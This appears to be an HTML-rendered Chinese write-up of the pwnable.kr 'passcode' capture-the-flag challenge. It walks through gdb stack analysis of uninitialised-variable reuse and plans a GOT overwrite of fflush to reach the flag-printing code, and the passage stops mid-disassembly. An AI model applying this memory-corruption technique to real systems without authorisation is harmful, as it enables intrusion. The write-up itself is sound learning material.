@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>WriteUp</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+<style type="text/css">
+.highlight  { background: #ffffff; }
+.highlight .c { color: #999988; font-style: italic } /* Comment */
+.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
+.highlight .k { font-weight: bold } /* Keyword */
+.highlight .o { font-weight: bold } /* Operator */
+.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
+.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
+.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #aa0000 } /* Generic.Error */
+.highlight .gh { color: #999999 } /* Generic.Heading */
+.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
+.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
+.highlight .go { color: #888888 } /* Generic.Output */
+.highlight .gp { color: #555555 } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
+.highlight .gt { color: #aa0000 } /* Generic.Traceback */
+.highlight .kc { font-weight: bold } /* Keyword.Constant */
+.highlight .kd { font-weight: bold } /* Keyword.Declaration */
+.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
+.highlight .kr { font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
+.highlight .m { color: #009999 } /* Literal.Number */
+.highlight .s { color: #d14 } /* Literal.String */
+.highlight .na { color: #008080 } /* Name.Attribute */
+.highlight .nb { color: #0086B3 } /* Name.Builtin */
+.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
+.highlight .no { color: #008080 } /* Name.Constant */
+.highlight .ni { color: #800080 } /* Name.Entity */
+.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
+.highlight .nn { color: #555555 } /* Name.Namespace */
+.highlight .nt { color: #000080 } /* Name.Tag */
+.highlight .nv { color: #008080 } /* Name.Variable */
+.highlight .ow { font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mf { color: #009999 } /* Literal.Number.Float */
+.highlight .mh { color: #009999 } /* Literal.Number.Hex */
+.highlight .mi { color: #009999 } /* Literal.Number.Integer */
+.highlight .mo { color: #009999 } /* Literal.Number.Oct */
+.highlight .sb { color: #d14 } /* Literal.String.Backtick */
+.highlight .sc { color: #d14 } /* Literal.String.Char */
+.highlight .sd { color: #d14 } /* Literal.String.Doc */
+.highlight .s2 { color: #d14 } /* Literal.String.Double */
+.highlight .se { color: #d14 } /* Literal.String.Escape */
+.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
+.highlight .si { color: #d14 } /* Literal.String.Interpol */
+.highlight .sx { color: #d14 } /* Literal.String.Other */
+.highlight .sr { color: #009926 } /* Literal.String.Regex */
+.highlight .s1 { color: #d14 } /* Literal.String.Single */
+.highlight .ss { color: #990073 } /* Literal.String.Symbol */
+.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
+.highlight .vc { color: #008080 } /* Name.Variable.Class */
+.highlight .vg { color: #008080 } /* Name.Variable.Global */
+.highlight .vi { color: #008080 } /* Name.Variable.Instance */
+.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
+.pl-c {
+    color: #969896;
+}
+
+.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
+    color: #0086b3;
+}
+
+.pl-e,.pl-en {
+    color: #795da3;
+}
+
+.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
+    color: #333;
+}
+
+.pl-ent {
+    color: #63a35c;
+}
+
+.pl-k,.pl-s,.pl-st {
+    color: #a71d5d;
+}
+
+.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
+    color: #df5000;
+}
+
+.pl-id {
+    color: #b52a1d;
+}
+
+.pl-ii {
+    background-color: #b52a1d;
+    color: #f8f8f8;
+}
+
+.pl-sr .pl-cce {
+    color: #63a35c;
+    font-weight: bold;
+}
+
+.pl-ml {
+    color: #693a17;
+}
+
+.pl-mh,.pl-mh .pl-en,.pl-ms {
+    color: #1d3e81;
+    font-weight: bold;
+}
+
+.pl-mq {
+    color: #008080;
+}
+
+.pl-mi {
+    color: #333;
+    font-style: italic;
+}
+
+.pl-mb {
+    color: #333;
+    font-weight: bold;
+}
+
+.pl-md,.pl-mdhf {
+    background-color: #ffecec;
+    color: #bd2c00;
+}
+
+.pl-mdht,.pl-mi1 {
+    background-color: #eaffea;
+    color: #55a532;
+}
+
+.pl-mdr {
+    color: #795da3;
+    font-weight: bold;
+}
+
+.pl-mo {
+    color: #1d3e81;
+}
+.task-list {
+padding-left:10px;
+margin-bottom:0;
+}
+
+.task-list li {
+    margin-left: 20px;
+}
+
+.task-list-item {
+list-style-type:none;
+padding-left:10px;
+}
+
+.task-list-item label {
+font-weight:400;
+}
+
+.task-list-item.enabled label {
+cursor:pointer;
+}
+
+.task-list-item+.task-list-item {
+margin-top:3px;
+}
+
+.task-list-item-checkbox {
+display:inline-block;
+margin-left:-20px;
+margin-right:3px;
+vertical-align:1px;
+}
+</style>
+</head>
+<body>
+<h1 id="pwnable-kr-toddler-s-bottle-passcode">PWNABLE.KR-Toddler&#39;s Bottle-passcode</h1>
+<p><strong>Author:wnagzihxa1n<br>E-Mail:wnagzihxa1n@gmail.com</strong></p>
+<h2 id="problem-description">Problem Description</h2>
+<pre><code>Mommy told me to make a passcode based login system.
+My initial C code was compiled without any error!
+Well, there was some compiler warning, but who cares about that?
+
+ssh passcode@pwnable.kr -p2222 (pw:guest)
+</code></pre><p>ssh连上去</p>
+<pre><code>wnagzihxain@toT0C:~$ ssh passcode@pwnable.kr -p2222
+passcode@pwnable.kr&#39;s password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  &#39; / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  &#39;  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+
+- Site admin : daehee87.kr@gmail.com
+- IRC : irc.netgarage.org:6667 / #pwnable.kr
+- Simply type &quot;irssi&quot; command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+Last login: Wed Sep 27 00:22:14 2017 from 84.221.106.183
+</code></pre><p>查看目录下文件</p>
+<pre><code>passcode@ubuntu:~$ ls
+flag  passcode    passcode.c
+</code></pre><p>尝试读取源码文件</p>
+<pre><code>passcode@ubuntu:~$ cat passcode.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void login(){
+    int passcode1;
+    int passcode2;
+
+    printf(&quot;enter passcode1 : &quot;);
+    scanf(&quot;%d&quot;, passcode1);
+    fflush(stdin);
+
+    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+    printf(&quot;enter passcode2 : &quot;);
+        scanf(&quot;%d&quot;, passcode2);
+
+    printf(&quot;checking...\n&quot;);
+    if(passcode1==338150 &amp;&amp; passcode2==13371337){
+                printf(&quot;Login OK!\n&quot;);
+                system(&quot;/bin/cat flag&quot;);
+        }
+        else{
+                printf(&quot;Login Failed!\n&quot;);
+        exit(0);
+        }
+}
+
+void welcome(){
+    char name[100];
+    printf(&quot;enter you name : &quot;);
+    scanf(&quot;%100s&quot;, name);
+    printf(&quot;Welcome %s!\n&quot;, name);
+}
+
+int main(){
+    printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;);
+
+    welcome();
+    login();
+
+    // something after login...
+    printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);
+    return 0;    
+}
+</code></pre><p>将可执行文件编译出来，使用gdb调试，分析一下具体的情况，目前我初步的思路是<code>weicome</code>函数先执行，那么它会先开辟一部分的栈空间，使用完后通过对栈顶指针ESP的操作来平衡栈，然后调用第二个函数<code>login</code>，此时又会开辟栈空间，但是要注意的是，此时开辟出来的栈空间，虽然栈顶指针可能和第一个函数不一样，但是EBP肯定是一样的，而且此函数的栈空间数据并未初始化，还是上一个函数<code>welcome</code>使用后的，那么后面如果有直接获取这个栈空间初始数据的操作，就可以利用起来</p>
+<p>这里之所以这么说，是因为在<code>login</code>函数里，我看到了两个<code>scanf</code>函数没有用<code>&amp;</code>，如果有这个符号，那么就是在这个变量的内存空间写上数据，如果没有<code>&amp;</code>，相当于直接使用这个值作为地址，往这个值指向的内存空间写数据，而前面说过，<code>login</code>函数使用的是上一个函数的栈空间，起码有一部分是，那么我们只需要找到<code>passcode1</code>的<code>passcode2</code>在内存中的位置，然后在<code>weicome</code>函数进行输入时控制好偏移，即可达到任意地址写的效果</p>
+<p>开始调试，主要是先观察EBP以及栈空间的布局，<code>welcome</code>函数的EBP是<code>0xbfffef38</code></p>
+<pre><code> [----------------------------------registers-----------------------------------]
+EAX: 0x28 (&#39;(&#39;)
+EBX: 0x0 
+ECX: 0xffffffff 
+EDX: 0xb7fbc870 --&gt; 0x0 
+ESI: 0xb7fbb000 --&gt; 0x1b1db0 
+EDI: 0xb7fbb000 --&gt; 0x1b1db0 
+EBP: 0xbfffef38 --&gt; 0xbfffef48 --&gt; 0x0 
+ESP: 0xbfffef38 --&gt; 0xbfffef48 --&gt; 0x0 
+EIP: 0x804865b (&lt;welcome+3&gt;:    sub    esp,0x78)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048657 &lt;login+188&gt;:    ret    
+   0x8048658 &lt;welcome&gt;:    push   ebp
+   0x8048659 &lt;welcome+1&gt;:    mov    ebp,esp
+=&gt; 0x804865b &lt;welcome+3&gt;:    sub    esp,0x78
+   0x804865e &lt;welcome+6&gt;:    mov    eax,gs:0x14
+   0x8048664 &lt;welcome+12&gt;:    mov    DWORD PTR [ebp-0xc],eax
+   0x8048667 &lt;welcome+15&gt;:    xor    eax,eax
+   0x8048669 &lt;welcome+17&gt;:    sub    esp,0xc
+[------------------------------------stack-------------------------------------]
+0000| 0xbfffef38 --&gt; 0xbfffef48 --&gt; 0x0 
+0004| 0xbfffef3c --&gt; 0x80486db (&lt;main+38&gt;:    call   0x804859b &lt;login&gt;)
+0008| 0xbfffef40 --&gt; 0xb7fbb3dc --&gt; 0xb7fbc1e0 --&gt; 0x0 
+0012| 0xbfffef44 --&gt; 0xbfffef60 --&gt; 0x1 
+0016| 0xbfffef48 --&gt; 0x0 
+0020| 0xbfffef4c --&gt; 0xb7e21637 (&lt;__libc_start_main+247&gt;:    add    esp,0x10)
+0024| 0xbfffef50 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
+0028| 0xbfffef54 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804865b in welcome ()
+</code></pre><p>走到<code>scanf</code>函数，观察两个参数，第二个参数指向<code>0xbfffeec8</code>，那么加上100字节就是<code>0xbfffef2c</code></p>
+<pre><code> [----------------------------------registers-----------------------------------]
+EAX: 0xbfffeec8 --&gt; 0xb7fbc870 --&gt; 0x0 
+EBX: 0x0 
+ECX: 0x0 
+EDX: 0xb7fbc870 --&gt; 0x0 
+ESI: 0xb7fbb000 --&gt; 0x1b1db0 
+EDI: 0xb7fbb000 --&gt; 0x1b1db0 
+EBP: 0xbfffef38 --&gt; 0xbfffef48 --&gt; 0x0 
+ESP: 0xbfffeeb0 --&gt; 0x80487ed (&quot;%100s&quot;)
+EIP: 0x8048685 (&lt;welcome+45&gt;:    call   0x8048480 &lt;__isoc99_scanf@plt&gt;)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804867c &lt;welcome+36&gt;:    lea    eax,[ebp-0x70]
+   0x804867f &lt;welcome+39&gt;:    push   eax
+   0x8048680 &lt;welcome+40&gt;:    push   0x80487ed
+=&gt; 0x8048685 &lt;welcome+45&gt;:    call   0x8048480 &lt;__isoc99_scanf@plt&gt;
+   0x804868a &lt;welcome+50&gt;:    add    esp,0x10
+   0x804868d &lt;welcome+53&gt;:    sub    esp,0x8
+   0x8048690 &lt;welcome+56&gt;:    lea    eax,[ebp-0x70]
+   0x8048693 &lt;welcome+59&gt;:    push   eax
+Guessed arguments:
+arg[0]: 0x80487ed (&quot;%100s&quot;)
+arg[1]: 0xbfffeec8 --&gt; 0xb7fbc870 --&gt; 0x0 
+[------------------------------------stack-------------------------------------]
+0000| 0xbfffeeb0 --&gt; 0x80487ed (&quot;%100s&quot;)
+0004| 0xbfffeeb4 --&gt; 0xbfffeec8 --&gt; 0xb7fbc870 --&gt; 0x0 
+0008| 0xbfffeeb8 --&gt; 0x28 (&#39;(&#39;)
+0012| 0xbfffeebc --&gt; 0xb7e733ac (&lt;_IO_new_file_overflow+12&gt;:    add    edx,0x147c54)
+0016| 0xbfffeec0 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
+0020| 0xbfffeec4 --&gt; 0xb7fbbd60 --&gt; 0xfbad2a84 
+0024| 0xbfffeec8 --&gt; 0xb7fbc870 --&gt; 0x0 
+0028| 0xbfffeecc --&gt; 0xb7e73e12 (&lt;__GI___overflow+66&gt;:    add    esp,0x14)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08048685 in welcome ()
+</code></pre><p>因为读入100字节的数据，我们尝试输入100个<code>a</code>，用python生成</p>
+<pre><code>&gt;&gt;&gt; print 100 * &#39;a&#39;
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</code></pre><p>观察起始地址和结束地址</p>
+<pre><code>gdb-peda$ x/200x $esp
+0xbfffeeb0:    0xed    0x87    0x04    0x08    0xc8    0xee    0xff    0xbf
+0xbfffeeb8:    0x28    0x00    0x00    0x00    0xac    0x33    0xe7    0xb7
+0xbfffeec0:    0x00    0xb0    0xfb    0xb7    0x60    0xbd    0xfb    0xb7
+0xbfffeec8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0xbfffeed0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0xbfffeed8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0xbfffeee0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0xbfffeee8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0xbfffeef0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0xbfffeef8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0xbfffef00:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0xbfffef08:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0xbfffef10:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0xbfffef18:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0xbfffef20:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0xbfffef28:    0x61    0x61    0x61    0x61    0x00    0x3b    0xbf    0x4d
+0xbfffef30:    0x00    0x88    0x04    0x08    0xf4    0xef    0xff    0xbf
+0xbfffef38:    0x48    0xef    0xff    0xbf    0xdb    0x86    0x04    0x08
+0xbfffef40:    0xdc    0xb3    0xfb    0xb7    0x60    0xef    0xff    0xbf
+0xbfffef48:    0x00    0x00    0x00    0x00    0x37    0x16    0xe2    0xb7
+0xbfffef50:    0x00    0xb0    0xfb    0xb7    0x00    0xb0    0xfb    0xb7
+0xbfffef58:    0x00    0x00    0x00    0x00    0x37    0x16    0xe2    0xb7
+0xbfffef60:    0x01    0x00    0x00    0x00    0xf4    0xef    0xff    0xbf
+0xbfffef68:    0xfc    0xef    0xff    0xbf    0x00    0x00    0x00    0x00
+0xbfffef70:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+</code></pre><p>然后进入<code>login</code>函数，观察EBP，确实是和<code>welcome</code>函数同样的EBP，我们单步到达<code>scanf</code>函数，观察到第二个参数是我们之前输入的数据</p>
+<pre><code> [----------------------------------registers-----------------------------------]
+EAX: 0x12 
+EBX: 0x0 
+ECX: 0x0 
+EDX: 0xb7fbc870 --&gt; 0x0 
+ESI: 0xb7fbb000 --&gt; 0x1b1db0 
+EDI: 0xb7fbb000 --&gt; 0x1b1db0 
+EBP: 0xbfffef38 --&gt; 0xbfffef48 --&gt; 0x0 
+ESP: 0xbfffef10 --&gt; 0x8048793 --&gt; 0x65006425 (&#39;%d&#39;)
+EIP: 0x80485bc (&lt;login+33&gt;:    call   0x8048480 &lt;__isoc99_scanf@plt&gt;)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80485b1 &lt;login+22&gt;:    sub    esp,0x8
+   0x80485b4 &lt;login+25&gt;:    push   DWORD PTR [ebp-0x10]
+   0x80485b7 &lt;login+28&gt;:    push   0x8048793
+=&gt; 0x80485bc &lt;login+33&gt;:    call   0x8048480 &lt;__isoc99_scanf@plt&gt;
+   0x80485c1 &lt;login+38&gt;:    add    esp,0x10
+   0x80485c4 &lt;login+41&gt;:    mov    eax,ds:0x804a040
+   0x80485c9 &lt;login+46&gt;:    sub    esp,0xc
+   0x80485cc &lt;login+49&gt;:    push   eax
+Guessed arguments:
+arg[0]: 0x8048793 --&gt; 0x65006425 (&#39;%d&#39;)
+arg[1]: 0x61616161 (&#39;aaaa&#39;)
+[------------------------------------stack-------------------------------------]
+0000| 0xbfffef10 --&gt; 0x8048793 --&gt; 0x65006425 (&#39;%d&#39;)
+0004| 0xbfffef14 (&#39;a&#39; &lt;repeats 24 times&gt;)
+0008| 0xbfffef18 (&#39;a&#39; &lt;repeats 20 times&gt;)
+0012| 0xbfffef1c (&#39;a&#39; &lt;repeats 16 times&gt;)
+0016| 0xbfffef20 (&#39;a&#39; &lt;repeats 12 times&gt;)
+0020| 0xbfffef24 (&quot;aaaaaaaa&quot;)
+0024| 0xbfffef28 (&quot;aaaa&quot;)
+0028| 0xbfffef2c --&gt; 0x4dbf3b00 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080485bc in login ()
+</code></pre><p>再观察之前的压栈指令，可以看到是距离EBP长度为<code>0x10</code>的位置</p>
+<pre><code>0x80485b4 &lt;login+25&gt;:    push   DWORD PTR [ebp-0x10]
+</code></pre><p>那我们来计算下这个位置是哪里</p>
+<pre><code>&gt;&gt;&gt; hex(0xbfffef38 - 0x10)
+&#39;0xbfffef28L&#39;
+</code></pre><p>再看之前我们在<code>welcome</code>函数输入字符串时的覆盖范围</p>
+<pre><code>0xbfffef28:    0x61    0x61    0x61    0x61    0x00    0x3b    0xbf    0x4d
+</code></pre><p>惊喜的发现，最后4个字节刚好可以覆盖到<code>passcode1</code>变量</p>
+<p>那么我们只需要将输入的100字节最后4字节控制好即可达到任意地址写的效果</p>
+<p>此时我们来观察下面的代码，有个<code>fflush</code>函数，这个函数是用于清空流的，那么结合这个任意地址写的功能，我们可以将GOT表里<code>fflush</code>函数的地址改为<code>system(&quot;/bin/cat flag&quot;)</code>函数的地址</p>
+<pre><code>scanf(&quot;%d&quot;, passcode1);
+fflush(stdin);
+
+// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+printf(&quot;enter passcode2 : &quot;);
+scanf(&quot;%d&quot;, passcode2);
+
+printf(&quot;checking...\n&quot;);
+if(passcode1 == 338150 &amp;&amp; passcode2 == 13371337){
+        printf(&quot;Login OK!\n&quot;);
+        system(&quot;/bin/cat flag&quot;);
+}
+    else{
+    printf(&quot;Login Failed!\n&quot;);
+    exit(0);
+}
+</code></pre><p>所以，当输入执行完的时候，调用<code>fflush</code>函数，此时GOT表中已经被改为<code>system(&quot;/bin/cat flag&quot;)</code>这句的汇编地址，不是<code>system</code>函数的地址，是程序里的地址，那么程序流程就会跳到我们改写的地址，从而读取出Flag</p>
+<p>初步的思想是这样，接下来我们来实现一下刚才的思路</p>
+<p>首先我们要找到GOT表中<code>fflush</code>函数的地址是<code>0x0804a004</code>，要注意一点，我们要在服务器上用<code>readelf</code>命令</p>
+<pre><code>passcode@ubuntu:~$ readelf -r passcode
+
+Relocation section &#39;.rel.dyn&#39; at offset 0x388 contains 2 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+08049ff0  00000606 R_386_GLOB_DAT    00000000   __gmon_start__
+0804a02c  00000b05 R_386_COPY        0804a02c   stdin@GLIBC_2.0
+
+Relocation section &#39;.rel.plt&#39; at offset 0x398 contains 9 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
+0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
+0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
+0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
+0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
+0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__
+0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
+0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
+0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
+</code></pre><p>我们要在这个地址写上什么呢？</p>
+<p>当然是我们要跳转到的汇编地址，依旧是在服务器上查看汇编，因为如果本地编译源码生成的可执行文件指令偏移不一定和服务器上面的可执行文件一样，我们跳转到<code>system</code>函数的压参那句代码<code>0x080485e3</code></p>
+<pre><code>passcode@ubuntu:~$ objdump -S passcode
+
+passcode:     file format elf32-i386
+
+Disassembly of section .init:
+
+......
+
+08048564 &lt;login&gt;:
+ 8048564:    55                       push   %ebp
+ 8048565:    89 e5                    mov    %esp,%ebp
+ 8048567:    83 ec 28                 sub    $0x28,%esp
+ 804856a:    b8 70 87 04 08           mov    $0x8048770,%eax
+ 804856f:    89 04 24                 mov    %eax,(%esp)
+ 8048572:    e8 a9 fe ff ff           call   8048420 &lt;printf@plt&gt;
+ 8048577:    b8 83 87 04 08           mov    $0x8048783,%eax
+ 804857c:    8b 55 f0                 mov    -0x10(%ebp),%edx
+ 804857f:    89 54 24 04              mov    %edx,0x4(%esp)
+ 8048583:    89 04 24                 mov    %eax,(%esp)
+ 8048586:    e8 15 ff ff ff           call   80484a0 &lt;__isoc99_scanf@plt&gt;
+ 804858b:    a1 2c a0 04 08           mov    0x804a02c,%eax
+ 8048590:    89 04 24                 mov    %eax,(%esp)
+ 8048593:    e8 98 fe ff ff           call   8048430 &lt;fflush@plt&gt;
+ 8048598:    b8 86 87 04 08           mov    $0x8048786,%eax
+ 804859d:    89 04 24                 mov    %eax,(%esp)
+ 80485a0:    e8 7b fe ff ff           call   8048420 &lt;printf@plt&gt;
